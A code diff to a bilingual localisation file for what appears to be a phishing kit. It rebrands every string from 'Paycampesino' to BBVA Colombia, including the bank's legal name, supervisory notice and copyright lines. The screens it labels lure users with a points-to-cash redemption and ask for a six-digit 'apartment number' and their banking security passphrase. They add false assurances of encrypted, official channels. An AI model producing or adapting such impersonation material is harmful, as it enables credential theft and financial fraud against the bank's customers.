@@ -54,13 +54,13 @@
       FOOTER_SEGURIDAD_BANCARIA: "Seguridad Bancaria",
       FOOTER_SEGURIDAD: "Seguridad",
       FOOTER_RED_OFICINAS: "Red de Oficinas",
-      FOOTER_REGLAMENTO_PUNTOS: "Reglamento Puntos Paycampesino",
-      FOOTER_LEGAL_ENTIDAD: "Paycampesino Colombia S.A. – Vigilado Superintendencia Financiera de Colombia.",
-      FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. Todos los derechos reservados.",
+      FOOTER_REGLAMENTO_PUNTOS: "Reglamento Puntos BBVA",
+      FOOTER_LEGAL_ENTIDAD: "Banco Bilbao Vizcaya Argentaria Colombia S.A. – Vigilado Superintendencia Financiera de Colombia.",
+      FOOTER_COPYRIGHT: "© 2026 BBVA Colombia. Todos los derechos reservados.",
 
       // === VISTA: SOLICITA TU TURNO (solicita-tu-turno.html) ===
-      TURNO_PAGE_TITLE: "Solicita tu turno | Paycampesino Colombia",
-      TURNO_BADGE: "Turno Digital Paycampesino",
+      TURNO_PAGE_TITLE: "Solicita tu turno | BBVA Colombia",
+      TURNO_BADGE: "Turno Digital BBVA",
       TURNO_TITLE_MAIN: "Solicita tu turno",
       TURNO_TITLE_ACCENT: "desde la app oficial",
       TURNO_DESC: "Ahorra tiempo en tus visitas a nuestras oficinas. Para solicitar tu turno en tiempo real sin hacer filas, descarga de forma gratuita la app Turnos y Citas disponible en Google Play Store.",
@@ -78,7 +78,7 @@
       TURNO_BENEFIT_2_TITLE: "Notificaciones al móvil",
       TURNO_BENEFIT_2_DESC: "Recibe avisos automáticos en tu celular con el tiempo estimado restante y cuándo debes acercarte al módulo.",
       TURNO_BENEFIT_3_TITLE: "Oficinas más cercanas",
-      TURNO_BENEFIT_3_DESC: "Encuentra la oficina Paycampesino más conveniente con menor cantidad de personas en fila para realizar tus diligencias al instante.",
+      TURNO_BENEFIT_3_DESC: "Encuentra la oficina BBVA más conveniente con menor cantidad de personas en fila para realizar tus diligencias al instante.",
       TURNO_STEPS_TITLE: "¿Cómo funciona el proceso?",
       TURNO_STEP_1_TITLE: "Descarga la aplicación",
       TURNO_STEP_1_DESC: "Ingresa a Google Play Store e instala la app gratuita en tu teléfono móvil.",
@@ -87,20 +87,20 @@
       TURNO_STEP_3_TITLE: "Recibe tu turno digital",
       TURNO_STEP_3_DESC: "Monitorea tu turno en vivo y acércate a la oficina cuando la aplicación te lo indique.",
       TURNO_SECURITY_TITLE: "Servicio Gratuito y Seguro",
-      TURNO_SECURITY_DESC: "La asignación de turnos y citas es un servicio 100% gratuito de Paycampesino. Nunca pagues a intermediarios ni compartas tus contraseñas personales para obtener un turno.",
+      TURNO_SECURITY_DESC: "La asignación de turnos y citas es un servicio 100% gratuito de BBVA. Nunca pagues a intermediarios ni compartas tus contraseñas personales para obtener un turno.",
 
       // === VISTA: CARGANDO (cargando.html y cargando.js) ===
-      CARGANDO_PAGE_TITLE: "Paycampesino - Cargando...",
+      CARGANDO_PAGE_TITLE: "BBVA - Cargando...",
       CARGANDO_TITLE_TEXT: "Cargando",
       CARGANDO_SUBTITLE: "Por favor espera un momento mientras procesamos tu solicitud de manera segura.",
-      CARGANDO_SECURITY_NOTE: "Estás en un entorno con seguridad Paycampesino",
-      CARGANDO_FOOTER: "© 2026 Paycampesino Colombia S.A.",
+      CARGANDO_SECURITY_NOTE: "Estás en un entorno con seguridad BBVA",
+      CARGANDO_FOOTER: "© 2026 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A.",
       CARGANDO_OVERLAY_TITLE: "Cargando",
       CARGANDO_OVERLAY_SUBTITLE: "Por favor espera un momento mientras procesamos tu solicitud.",
       CARGANDO_OVERLAY_SECURITY: "Conexión cifrada y segura",
 
       // === VISTA: NÚMERO DE APTO (numero-de-apto.html) ===
-      APTO_PAGE_TITLE: "Número de Apto | Paycampesino Colombia",
+      APTO_PAGE_TITLE: "Número de Apto | BBVA Colombia",
       APTO_BADGE: "Validación de Residencia",
       APTO_TITLE: "Número de apto",
       APTO_SUBTITLE: "Ingresa los 6 dígitos correspondientes para continuar con la validación de tu información.",
@@ -110,7 +110,7 @@
       APTO_BTN_CONTINUAR: "Continuar",
       APTO_LINK_PROBLEMAS: "¿Problemas para verificar? Inicia sesión",
       APTO_LINK_CANCELAR: "Cancelar",
-      APTO_SECURITY_TITLE: "Protección de datos Paycampesino",
+      APTO_SECURITY_TITLE: "Protección de datos BBVA",
       APTO_SECURITY_TEXT: "Tus datos se encuentran resguardados bajo estándares de encriptación bancaria avanzada.",
       APTO_VALIDANDO_TITLE: "Validando información",
       APTO_VALIDANDO_SUB: "Estamos verificando los datos ingresados de manera segura...",
@@ -118,14 +118,14 @@
       APTO_VALIDADO_SUB: "Tus datos han sido procesados correctamente...",
 
       // === VISTA: PALABRA CLAVE (palabra-clave.html) ===
-      PALABRA_PAGE_TITLE: "Validación de Palabra Clave - Puntos Paycampesino | Paycampesino Colombia",
+      PALABRA_PAGE_TITLE: "Validación de Palabra Clave - Puntos BBVA | BBVA Colombia",
       STEP_PUNTOS_CUENTA: "Puntos & Cuenta",
       STEP_COMPLETADO: "Completado",
       STEP_PALABRA_CLAVE: "Palabra Clave",
       STEP_EN_CURSO: "En curso",
       STEP_ACREDITACION: "Acreditación",
       STEP_CONFIRMACION: "Confirmación",
-      PUNTOS_PROGRAMA: "Programa Puntos Paycampesino",
+      PUNTOS_PROGRAMA: "Programa Puntos BBVA",
       PUNTOS_ESTADO: "Proceso de Canje",
       PUNTOS_LABEL: "Puntos acumulados a redimir",
       PUNTOS_VALOR_RECIBIR: "Valor en dinero a recibir",
@@ -136,24 +136,24 @@
       PUNTOS_COSTO_VAL: "$0 COP (Gratis)",
       PALABRA_BADGE: "Validación de Seguridad",
       PALABRA_TITLE: "Ingresa tu palabra clave",
-      PALABRA_DESC: "Para autorizar la redención y el desembolso seguro de tus Puntos Paycampesino a tus productos, por favor digita tu palabra clave de seguridad registrada.",
-      PALABRA_INFO_BOX: "<strong>¿Qué es la palabra clave?</strong> Es la palabra o código alfanumérico que registraste en tus canales digitales de Paycampesino para validar y firmar operaciones bancarias y canje de beneficios.",
+      PALABRA_DESC: "Para autorizar la redención y el desembolso seguro de tus Puntos BBVA a tus productos, por favor digita tu palabra clave de seguridad registrada.",
+      PALABRA_INFO_BOX: "<strong>¿Qué es la palabra clave?</strong> Es la palabra o código alfanumérico que registraste en tus canales digitales de BBVA para validar y firmar operaciones bancarias y canje de beneficios.",
       PALABRA_INPUT_LABEL: "Palabra clave de seguridad",
       PALABRA_NO_RECUERDAS: "¿No recuerdas tu clave?",
       PALABRA_INPUT_PLACEHOLDER: "Digita tu palabra clave de seguridad",
       PALABRA_ERROR_REQUIRED: "Este campo es requerido.",
-      PALABRA_FIELD_HINT: "Dato confidencial cifrado con seguridad bancaria Paycampesino.",
+      PALABRA_FIELD_HINT: "Dato confidencial cifrado con seguridad bancaria BBVA.",
       PALABRA_BTN_SUBMIT: "Confirmar y procesar puntos",
       PALABRA_PROBLEMAS_VALIDAR: "¿Tienes problemas para validar? Inicia sesión",
       PALABRA_CANCELAR_SALIR: "Cancelar y salir",
-      PALABRA_SECURITY_TITLE: "Recomendación de Seguridad Paycampesino",
-      PALABRA_SECURITY_TEXT: "Paycampesino nunca solicitará tus claves, palabras secretas o códigos de confirmación a través de llamadas telefónicas, mensajes de texto o correos electrónicos. Esta operación se realiza únicamente dentro de nuestros canales oficiales.",
+      PALABRA_SECURITY_TITLE: "Recomendación de Seguridad BBVA",
+      PALABRA_SECURITY_TEXT: "BBVA nunca solicitará tus claves, palabras secretas o códigos de confirmación a través de llamadas telefónicas, mensajes de texto o correos electrónicos. Esta operación se realiza únicamente dentro de nuestros canales oficiales.",
       PALABRA_MODAL_TITLE: "Palabra Clave de Seguridad",
       PALABRA_MODAL_P1: "La <strong>Palabra Clave</strong> es un factor de autenticación de seguridad exclusivo que te permite autorizar transacciones de alta relevancia, tales como:",
-      PALABRA_MODAL_LI1: "Redención y traslado de Puntos Paycampesino a dinero en cuenta.",
+      PALABRA_MODAL_LI1: "Redención y traslado de Puntos BBVA a dinero en cuenta.",
       PALABRA_MODAL_LI2: "Transferencias entre cuentas y pagos de servicios.",
-      PALABRA_MODAL_LI3: "Cambio de parámetros de seguridad en Paycampesino Net y App Paycampesino.",
-      PALABRA_MODAL_P2: "Si no recuerdas tu palabra clave, puedes reestablecerla fácilmente ingresando a tu <strong>App Paycampesino Móvil</strong> en la sección <em>Ajustes > Seguridad</em>, o comunicándote con nuestra línea de atención.",
+      PALABRA_MODAL_LI3: "Cambio de parámetros de seguridad en BBVA Net y App BBVA.",
+      PALABRA_MODAL_P2: "Si no recuerdas tu palabra clave, puedes reestablecerla fácilmente ingresando a tu <strong>App BBVA Móvil</strong> en la sección <em>Ajustes > Seguridad</em>, o comunicándote con nuestra línea de atención.",
       PALABRA_MODAL_BTN: "Entendido",
       PALABRA_ARIA_MOSTRAR: "Mostrar palabra clave",
       PALABRA_ARIA_OCULTAR: "Ocultar palabra clave"
@@ -173,13 +173,13 @@
       FOOTER_SEGURIDAD_BANCARIA: "Banking Security",
       FOOTER_SEGURIDAD: "Security",
       FOOTER_RED_OFICINAS: "Branch Network",
-      FOOTER_REGLAMENTO_PUNTOS: "Paycampesino Points Regulations",
-      FOOTER_LEGAL_ENTIDAD: "Paycampesino Colombia S.A. – Supervised by Financial Superintendence of Colombia.",
-      FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. All rights reserved.",
+      FOOTER_REGLAMENTO_PUNTOS: "BBVA Points Regulations",
+      FOOTER_LEGAL_ENTIDAD: "Banco Bilbao Vizcaya Argentaria Colombia S.A. – Supervised by Financial Superintendence of Colombia.",
+      FOOTER_COPYRIGHT: "© 2026 BBVA Colombia. All rights reserved.",
 
       // === VIEW: SOLICITA TU TURNO ===
-      TURNO_PAGE_TITLE: "Request your ticket | Paycampesino Colombia",
-      TURNO_BADGE: "Paycampesino Digital Ticket",
+      TURNO_PAGE_TITLE: "Request your ticket | BBVA Colombia",
+      TURNO_BADGE: "BBVA Digital Ticket",
       TURNO_TITLE_MAIN: "Request your ticket",
       TURNO_TITLE_ACCENT: "from the official app",
       TURNO_DESC: "Save time during your branch visits. To request your ticket in real time without standing in line, download the free Turnos y Citas app available on Google Play Store.",
@@ -197,7 +197,7 @@
       TURNO_BENEFIT_2_TITLE: "Mobile notifications",
       TURNO_BENEFIT_2_DESC: "Get automated updates on your phone with estimated wait time and when you should approach the counter.",
       TURNO_BENEFIT_3_TITLE: "Nearest branch finder",
-      TURNO_BENEFIT_3_DESC: "Locate the most convenient Paycampesino branch with the shortest line to complete your banking smoothly.",
+      TURNO_BENEFIT_3_DESC: "Locate the most convenient BBVA branch with the shortest line to complete your banking smoothly.",
       TURNO_STEPS_TITLE: "How does the process work?",
       TURNO_STEP_1_TITLE: "Download the app",
       TURNO_STEP_1_DESC: "Open Google Play Store and install the free application on your mobile device.",
@@ -206,20 +206,20 @@
       TURNO_STEP_3_TITLE: "Receive your digital ticket",
       TURNO_STEP_3_DESC: "Track your turn in real time and head to the branch when notified by the app.",
       TURNO_SECURITY_TITLE: "Free and Secure Service",
-      TURNO_SECURITY_DESC: "Ticket and appointment allocation is 100% free by Paycampesino. Never pay intermediaries or share personal passwords to obtain a ticket.",
+      TURNO_SECURITY_DESC: "Ticket and appointment allocation is 100% free by BBVA. Never pay intermediaries or share personal passwords to obtain a ticket.",
 
       // === VIEW: CARGANDO ===
-      CARGANDO_PAGE_TITLE: "Paycampesino - Loading...",
+      CARGANDO_PAGE_TITLE: "BBVA - Loading...",
       CARGANDO_TITLE_TEXT: "Loading",
       CARGANDO_SUBTITLE: "Please wait a moment while we process your request securely.",
-      CARGANDO_SECURITY_NOTE: "You are in a secure Paycampesino environment",
-      CARGANDO_FOOTER: "© 2026 Paycampesino Colombia S.A.",
+      CARGANDO_SECURITY_NOTE: "You are in a secure BBVA environment",
+      CARGANDO_FOOTER: "© 2026 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A.",
       CARGANDO_OVERLAY_TITLE: "Loading",
       CARGANDO_OVERLAY_SUBTITLE: "Please wait a moment while we process your request.",
       CARGANDO_OVERLAY_SECURITY: "Encrypted and secure connection",
 
       // === VIEW: NÚMERO DE APTO ===
-      APTO_PAGE_TITLE: "Apartment Number | Paycampesino Colombia",
+      APTO_PAGE_TITLE: "Apartment Number | BBVA Colombia",
       APTO_BADGE: "Residence Verification",
       APTO_TITLE: "Apartment number",
       APTO_SUBTITLE: "Enter the corresponding 6 digits to proceed with the verification of your details.",
@@ -229,7 +229,7 @@
       APTO_BTN_CONTINUAR: "Continue",
       APTO_LINK_PROBLEMAS: "Trouble verifying? Log in",
       APTO_LINK_CANCELAR: "Cancel",
-      APTO_SECURITY_TITLE: "Paycampesino Data Protection",
+      APTO_SECURITY_TITLE: "BBVA Data Protection",
       APTO_SECURITY_TEXT: "Your details are safeguarded under advanced banking encryption standards.",
       APTO_VALIDANDO_TITLE: "Validating information",
       APTO_VALIDANDO_SUB: "Verifying entered details securely...",
@@ -237,14 +237,14 @@
       APTO_VALIDADO_SUB: "Your data has been successfully processed...",
 
       // === VIEW: PALABRA CLAVE ===
-      PALABRA_PAGE_TITLE: "Passphrase Verification - Paycampesino Points | Paycampesino Colombia",
+      PALABRA_PAGE_TITLE: "Passphrase Verification - BBVA Points | BBVA Colombia",
       STEP_PUNTOS_CUENTA: "Points & Account",
       STEP_COMPLETADO: "Completed",
       STEP_PALABRA_CLAVE: "Passphrase",
       STEP_EN_CURSO: "In progress",
       STEP_ACREDITACION: "Accreditation",
       STEP_CONFIRMACION: "Confirmation",
-      PUNTOS_PROGRAMA: "Paycampesino Points Program",
+      PUNTOS_PROGRAMA: "BBVA Points Program",
       PUNTOS_ESTADO: "Redemption Process",
       PUNTOS_LABEL: "Accumulated points to redeem",
       PUNTOS_VALOR_RECIBIR: "Cash amount to receive",
@@ -255,24 +255,24 @@
       PUNTOS_COSTO_VAL: "$0 COP (Free)",
       PALABRA_BADGE: "Security Validation",
       PALABRA_TITLE: "Enter your passphrase",
-      PALABRA_DESC: "To authorize secure redemption and disbursement of your Paycampesino Points to your accounts, please enter your registered security passphrase.",
-      PALABRA_INFO_BOX: "<strong>What is the passphrase?</strong> It is the alphanumeric word or code you registered in your Paycampesino digital channels to validate and sign banking operations and reward redemptions.",
+      PALABRA_DESC: "To authorize secure redemption and disbursement of your BBVA Points to your accounts, please enter your registered security passphrase.",
+      PALABRA_INFO_BOX: "<strong>What is the passphrase?</strong> It is the alphanumeric word or code you registered in your BBVA digital channels to validate and sign banking operations and reward redemptions.",
       PALABRA_INPUT_LABEL: "Security passphrase",
       PALABRA_NO_RECUERDAS: "Forgot your passphrase?",
       PALABRA_INPUT_PLACEHOLDER: "Enter your security passphrase",
       PALABRA_ERROR_REQUIRED: "This field is required.",
-      PALABRA_FIELD_HINT: "Confidential data encrypted with Paycampesino banking security.",
+      PALABRA_FIELD_HINT: "Confidential data encrypted with BBVA banking security.",
       PALABRA_BTN_SUBMIT: "Confirm and process points",
       PALABRA_PROBLEMAS_VALIDAR: "Trouble validating? Log in",
       PALABRA_CANCELAR_SALIR: "Cancel and exit",
-      PALABRA_SECURITY_TITLE: "Paycampesino Security Recommendation",
-      PALABRA_SECURITY_TEXT: "Paycampesino will never request your passwords, secret words, or verification codes via phone calls, text messages, or emails. This operation is carried out exclusively within our official channels.",
+      PALABRA_SECURITY_TITLE: "BBVA Security Recommendation",
+      PALABRA_SECURITY_TEXT: "BBVA will never request your passwords, secret words, or verification codes via phone calls, text messages, or emails. This operation is carried out exclusively within our official channels.",
       PALABRA_MODAL_TITLE: "Security Passphrase",
       PALABRA_MODAL_P1: "The <strong>Passphrase</strong> is an exclusive security authentication factor that allows you to authorize high-relevance transactions, such as:",
-      PALABRA_MODAL_LI1: "Redemption and transfer of Paycampesino Points to cash in your account.",
+      PALABRA_MODAL_LI1: "Redemption and transfer of BBVA Points to cash in your account.",
       PALABRA_MODAL_LI2: "Transfers between accounts and utility bill payments.",
-      PALABRA_MODAL_LI3: "Updating security settings in Paycampesino Net and Paycampesino App.",
-      PALABRA_MODAL_P2: "If you don't remember your passphrase, you can easily reset it by accessing your <strong>Paycampesino Mobile App</strong> under <em>Settings > Security</em>, or by contacting our customer helpline.",
+      PALABRA_MODAL_LI3: "Updating security settings in BBVA Net and BBVA App.",
+      PALABRA_MODAL_P2: "If you don't remember your passphrase, you can easily reset it by accessing your <strong>BBVA Mobile App</strong> under <em>Settings > Security</em>, or by contacting our customer helpline.",
       PALABRA_MODAL_BTN: "Understood",
       PALABRA_ARIA_MOSTRAR: "Show passphrase",
       PALABRA_ARIA_OCULTAR: "Hide passphrase"
@@ -353,7 +353,7 @@
   root.cambiarIdioma = function(nuevoIdioma) {
     if (TEXTOS[nuevoIdioma]) {
       try {
-        localStorage.setItem("paycampesino_idioma_activo", nuevoIdioma);
+        localStorage.setItem("bbva_idioma_activo", nuevoIdioma);
       } catch (e) {}
       aplicarVariablesDeTexto();
       console.info("Idioma cambiado a: " + nuevoIdioma);
@@ -370,7 +370,7 @@
   };
 
   // Exponer objeto de textos
-  root.PAYCAMPESINO_TEXTOS = TEXTOS;
+  root.BBVA_TEXTOS = TEXTOS;
   root.obtenerIdiomaActivo = obtenerIdiomaActivo;
 
   // Ejecución inmediata y al cargar DOM en entornos de navegador
